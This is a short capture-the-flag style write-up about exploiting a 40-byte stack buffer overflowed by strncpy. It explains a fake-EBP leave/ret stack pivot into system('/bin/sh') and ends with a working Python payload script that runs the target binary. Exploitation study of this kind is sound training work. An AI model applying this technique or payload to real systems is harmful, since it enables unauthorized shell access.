# Vulnerability
```c
char buffer[40];
strncpy(buffer, argv[1], 48);
```
This program uses strncpy but it copys 8 bytes more than buffer's bytes.

The protection code:
```c
if(argv[1][47] == '\xbf')
{
  printf("stack retbayed you!\n");
  exit(0);
}
if(argv[1][47] == '\x40')
{
  printf("library retbayed you, too!!\n");
  exit(0);
}
```
I am not able to use stack and library.

# Exploitation
I will give SFP a fake EBP and give RET a leave & ret address.

The SFP will be new EBP and by doing leave & ret again, esp will take ebp's value and pop 4 bytes to EIP.

First, I found leave & ret's address:
```
0x80484df <main+159>:	leave  
0x80484e0 <main+160>:	ret    
0x80484e1 <main+161>:	nop
```
And also found buffer's address:
```
(gdb) x/32x $esp-48
0xbffffa90:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffaa0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffab0:	0x41414141	0x41414141	0x42424242	0x43434343
```
The payload will be:
```
-------------------------------------------------------------------------------------------------------------------------------
| A * 4 | system's address(4) | system's ret(4) | system's param(/bin/sh) | A * 24 | SFP(buffer's address) | RET(leave & ret) |
-------------------------------------------------------------------------------------------------------------------------------
```
# Payload
```python
import os

payload = ""
payload = payload + "A"*4
payload = payload + "\xe0\x8a\x05\x40"
payload = payload + "AAAA"
payload = payload + "\xf9\xbf\x0f\x40"
payload = payload + "A"*24
payload = payload + "\x90\xfa\xff\xbf" # SFP buffer's address
payload = payload + "\xdf\x84\x04\x08" # RET leave & ret

os.execv("/home/assassin/zombie_assassin", ["", payload])
```
